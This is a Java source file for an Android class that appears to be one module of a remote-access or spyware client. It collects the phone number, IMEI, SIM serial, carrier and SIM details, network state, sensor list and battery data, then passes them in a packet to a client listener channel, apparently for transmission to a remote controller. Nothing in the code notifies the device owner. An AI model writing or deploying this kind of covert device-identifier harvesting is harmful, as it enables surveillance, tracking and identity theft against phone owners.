package my.app.Library;

import java.util.ArrayList;
import java.util.List;

import my.app.client.ClientListener;
import Packet.AdvancedInformationPacket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.telephony.TelephonyManager;

public class AdvancedSystemInfo {

	boolean waitingBattery = true;
	ClientListener ctx;
	int channel;
	AdvancedInformationPacket p;

	private final BroadcastReceiver batteryInfoReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {// http://developer.android.com/reference/android/os/BatteryManager.html
			final int health = intent.getIntExtra(BatteryManager.EXTRA_HEALTH, 0);
			final int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
			final int plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0);
			final boolean present = intent.getExtras().getBoolean(BatteryManager.EXTRA_PRESENT);
			final int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 0);
			final int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, 0);
			final String technology = intent.getExtras().getString(BatteryManager.EXTRA_TECHNOLOGY);
			final int temperature = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);
			final int voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0);

			AdvancedSystemInfo.this.p.setBatteryHealth(health);
			AdvancedSystemInfo.this.p.setBatteryLevel(level);
			AdvancedSystemInfo.this.p.setBatteryPlugged(plugged);
			AdvancedSystemInfo.this.p.setBatteryPresent(present);
			AdvancedSystemInfo.this.p.setBatteryScale(scale);
			AdvancedSystemInfo.this.p.setBatteryStatus(status);
			AdvancedSystemInfo.this.p.setBatteryTechnology(technology);
			AdvancedSystemInfo.this.p.setBatteryTemperature(temperature);
			AdvancedSystemInfo.this.p.setBatteryVoltage(voltage);

			// waitingBattery = false;
			AdvancedSystemInfo.this.ctx.handleData(AdvancedSystemInfo.this.channel,
				AdvancedSystemInfo.this.p.build());

			AdvancedSystemInfo.this.ctx
				.unregisterReceiver(AdvancedSystemInfo.this.batteryInfoReceiver);
		}
	};

	public AdvancedSystemInfo(ClientListener c, int channel) {
		this.p = new AdvancedInformationPacket();
		this.ctx = c;
		this.channel = channel;
	}

	public void androidInfo() {
		this.p.setAndroidVersion(android.os.Build.VERSION.RELEASE);
		this.p.setAndroidSdk(android.os.Build.VERSION.SDK_INT);
	}

	public void getInfos() {

		this.phoneInfo();
		this.networkInfo();
		this.androidInfo();
		this.sensorsInfo();

		this.ctx.registerReceiver(this.batteryInfoReceiver, new IntentFilter(
			Intent.ACTION_BATTERY_CHANGED));
		/*
		 * while(waitingBattery) { try { Thread.sleep(10); } catch(Exception e)
		 * {} }
		 */

		// ctx.handleData(channel, p.build());
	}

	public void networkInfo() {
		final ConnectivityManager cm = (ConnectivityManager) this.ctx
			.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo network = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

		this.p.setWifiAvailable(network.isAvailable());
		this.p.setWifiConnectedOrConnecting(network.isConnectedOrConnecting());
		this.p.setWifiExtraInfos(network.getExtraInfo());
		this.p.setWifiReason(network.getReason());

		network = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

		if (network != null
			&& (network.getSubtype() == TelephonyManager.NETWORK_TYPE_GPRS || network.getSubtype() == TelephonyManager.NETWORK_TYPE_EDGE))
			this.p.setMobileNetworkName("2g");
		else
			this.p.setMobileNetworkName("3g");

		this.p.setMobileNetworkAvailable(network.isAvailable());
		this.p.setMobileNetworkConnectedOrConnecting(network.isConnectedOrConnecting());
		this.p.setMobileNetworkExtraInfos(network.getExtraInfo());
		this.p.setMobileNetworkReason(network.getReason());
	}

	public void phoneInfo() {
		final TelephonyManager tm = (TelephonyManager) this.ctx
			.getSystemService(Context.TELEPHONY_SERVICE);
		this.p.setPhoneNumber(tm.getLine1Number());
		this.p.setIMEI(tm.getDeviceId());
		this.p.setSoftwareVersion(tm.getDeviceSoftwareVersion());
		this.p.setCountryCode(tm.getNetworkCountryIso());
		this.p.setOperatorCode(tm.getNetworkOperator());
		this.p.setOperatorName(tm.getNetworkOperatorName());
		this.p.setSimOperatorCode(tm.getSimOperator());
		this.p.setSimOperatorName(tm.getSimOperatorName());
		this.p.setSimCountryCode(tm.getSimCountryIso());
		this.p.setSimSerial(tm.getSimSerialNumber());
	}

	public void sensorsInfo() {
		final SensorManager mSensorManager = (SensorManager) this.ctx
			.getSystemService(Context.SENSOR_SERVICE);

		// List of Sensors Available
		final List<Sensor> msensorList = mSensorManager.getSensorList(Sensor.TYPE_ALL);

		final ArrayList<String> sensors = new ArrayList<String>();
		for (final Sensor s : msensorList)
			sensors.add(s.getName());
		this.p.setSensors(sensors);
	}
}
